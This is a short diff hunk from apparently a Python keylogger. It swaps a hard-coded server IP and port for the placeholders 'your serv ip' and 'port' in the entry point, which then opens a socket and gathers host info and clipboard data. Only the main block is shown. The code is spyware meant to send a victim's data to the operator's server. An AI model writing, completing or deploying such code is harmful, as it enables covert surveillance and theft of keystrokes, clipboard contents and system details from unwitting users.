@@ -131,7 +131,7 @@ class Keylogger:
 
 
 if __name__ == "__main__":
-    ke = Keylogger("172.28.14.78", 9999)
+    ke = Keylogger("your serv ip", "port")
     ke.start_socket()
     ke.host_info()
     ke.clipboard_data()
